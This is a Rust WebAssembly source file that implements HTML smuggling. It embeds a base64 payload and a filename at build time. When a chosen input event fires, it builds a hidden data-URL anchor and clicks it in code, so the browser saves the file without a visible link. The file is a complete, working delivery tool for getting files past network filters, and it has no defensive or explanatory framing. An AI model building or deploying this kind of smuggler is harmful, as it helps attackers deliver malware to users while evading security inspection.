use wasm_bindgen::prelude::*;
use web_sys::{ Document, HtmlAnchorElement, HtmlInputElement };
use console_error_panic_hook;

const TRIGGER_ID    : &str = env!("SMUGGLER_ID");         // The ID of the HTML input element we are using as a trigger.
const TRIGGER_EVENT : &str = env!("SMUGGLER_EVENT");      // Which event we should be handling on the trigger element.
const PAYLOAD       : &str = env!("SMUGGLER_PAYLOAD");    // The base64-encoded data that should be served to the user.
const FILENAME      : &str = env!("SMUGGLER_FILENAME");   // The filename that should be specified.

pub fn initiate_download(document: &Document, filename: &str, payload: &str) {
	// Create an invisible anchor element.
	let href = document.create_element("a").unwrap();
	let href : HtmlAnchorElement = href.dyn_into::<HtmlAnchorElement>().map_err(|_| ()).unwrap();
	
	// Build as a data URL and update the anchor.
	let link = format!("data:octet/stream;base64,{}", &payload);
	href.set_href(&link);
	href.set_download(&filename);
	
	// Simulate a click on the anchor, then remove it.
	let body = document.body().unwrap();
	body.append_child(&href).unwrap();
	
	href.click();
	href.remove();
}

#[wasm_bindgen]
pub fn init_panic_hook() {
    console_error_panic_hook::set_once();
}

#[wasm_bindgen(start)]
fn run() -> Result<(), JsValue> {
	// Retrieve handle to window and document.
	let window = web_sys::window().unwrap();
	let document = window.document().unwrap();
	
	// Retrieve element that will be used to trigger the smuggling (ID = dlinit).
	let dlinit = document.get_element_by_id(TRIGGER_ID).unwrap();
	let dlinit : HtmlInputElement = dlinit.dyn_into::<HtmlInputElement>().map_err(|_| ()).unwrap();
	
	// Set up an event handler for the element.
	let doc = document.clone();
	let handler = Closure::<dyn FnMut()>::new(move || {
		initiate_download(&doc, FILENAME, PAYLOAD);
	});	
	dlinit.add_event_listener_with_callback(TRIGGER_EVENT, handler.as_ref().unchecked_ref())?;
	handler.forget();

	Ok(())
}
